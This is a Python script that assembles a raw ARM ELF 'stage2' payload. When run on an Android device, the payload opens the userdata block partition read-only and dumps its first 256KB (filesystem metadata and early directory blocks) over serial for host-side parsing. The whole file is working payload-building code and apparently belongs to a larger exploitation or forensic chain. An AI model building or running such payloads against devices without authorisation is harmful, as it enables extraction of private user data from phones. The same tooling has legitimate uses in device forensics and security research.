"""Payload v23: dump the first 256KB of the userdata ext4 partition.

Reads from offset 0 (superblock + group descriptors + inode table + early
directory blocks) and streams the raw bytes over serial for host-side parsing.
"""

import struct

from keystone import keystone as K

BASE = 0x400000
ENTRY = BASE + 0x100

LABELS = {
    'v23': '\nV23\n',
    'blk_msg': '\n=== USERDATA_RAW ===\n',
    'end_msg': '\n=== V23_END ===\n',
    'ud': '/dev/block/platform/bootdevice/by-name/userdata',
    'eacces': 'EACCES\n',
    'enoent': 'ENOENT\n',
    'eperm': 'EPERM\n',
    'eother': 'EOTHER\n',
}
ORDER = list(LABELS)
DATA = b''.join(LABELS[k].encode() + b'\x00' for k in ORDER)
OFFSET = {}
_p = 0
for _k in ORDER:
    OFFSET[_k] = _p
    _p += len(LABELS[_k].encode()) + 1


def movconst(reg, value):
    return '    movw {0}, #{1:#06x}\n    movt {0}, #{2:#06x}'.format(
        reg, value & 0xFFFF, (value >> 16) & 0xFFFF
    )


def asm_source(addr_of):
    def C(reg, name):
        return movconst(reg, addr_of(name))

    return """
_start:
    push {{r4, r5, r6, lr}}

{v23}
    bl  puts

    // mmap 256KB buffer at 0x50000000
    movw r0, #0x0000
    movt r0, #0x5000
    movw r1, #0x0000
    movt r1, #0x0004
    mov r2, #3
    mov r3, #0x22
    mvn r4, #0
    mov r5, #0
    mov r7, #192
    svc #0
    mov r6, r0
    cmp r0, #0
    blt done

    // open userdata O_RDONLY
{ud}
    mov r1, #0
    bl  sys_open
    cmp r0, #0
    blt rd_fail
    mov r5, r0

    // read 256KB from offset 0
    mov r0, r5
    mov r1, r6
    movw r2, #0x0000
    movt r2, #0x0004
    mov r7, #3
    svc #0
    mov r4, r0

{blk_msg}
    bl  puts

    // write r4 bytes from r6 to fd 1
    mov r0, #1
    mov r1, r6
    mov r2, r4
    mov r7, #4
    svc #0

{end_msg}
    bl  puts
    b   done

rd_fail:
    bl  err_sym

done:
    mov r0, #0
    mov r7, #1
    svc #0

sys_open:
    mov r2, #0
    mov r7, #5
    svc #0
    bx  lr

err_sym:
    push {{lr}}
    cmn r0, #13
    beq err_eacces
    cmn r0, #2
    beq err_enoent
    cmn r0, #1
    beq err_eperm
{eother}
    bl  puts
    pop {{pc}}
err_eacces:
{eacces}
    bl  puts
    pop {{pc}}
err_enoent:
{enoent}
    bl  puts
    pop {{pc}}
err_eperm:
{eperm}
    bl  puts
    pop {{pc}}

puts:
    mov r1, r0
    mov r2, #0
puts_loop:
    ldrb r3, [r1, r2]
    cmp r3, #0
    beq puts_done
    add r2, r2, #1
    b   puts_loop
puts_done:
    mov r0, #1
    mov r7, #4
    svc #0
    bx  lr
""".format(
        v23=C('r0', 'v23'), blk_msg=C('r0', 'blk_msg'),
        end_msg=C('r0', 'end_msg'), ud=C('r0', 'ud'),
        eacces=C('r0', 'eacces'), enoent=C('r0', 'enoent'),
        eperm=C('r0', 'eperm'), eother=C('r0', 'eother'),
    )


def build_elf(code):
    pad = ENTRY - BASE - 52 - 32
    blob = b'\x00' * pad + code + DATA
    filesz = 52 + 32 + len(blob)
    ident = b'\x7fELF' + bytes([1, 1, 1, 0]) + b'\x00' * 8
    ehdr = ident + struct.pack(
        '<HHIIIIIHHHHHH', 2, 40, 1, ENTRY, 52, 0, 0, 52, 32, 1, 0, 0, 0,
    )
    phdr = struct.pack('<IIIIIIII', 1, 0, BASE, BASE, filesz, filesz, 7, 0x1000)
    return ehdr + phdr + blob


def main():
    ks = K.Ks(K.KS_ARCH_ARM, K.KS_MODE_ARM)
    code1, _ = ks.asm(asm_source(lambda n: BASE), ENTRY)
    code_len = len(bytes(code1))
    data_at = ENTRY + code_len
    code2, count = ks.asm(asm_source(lambda n: data_at + OFFSET[n]), ENTRY)
    code2 = bytes(code2)
    assert len(code2) == code_len, (len(code2), code_len)
    elf = build_elf(code2)
    with open('analysis/stage2_v23.elf', 'wb') as fout:
        fout.write(elf)
    print('code {:#x} elf {:#x} insns {}'.format(code_len, len(elf), count))


if __name__ == '__main__':
    main()
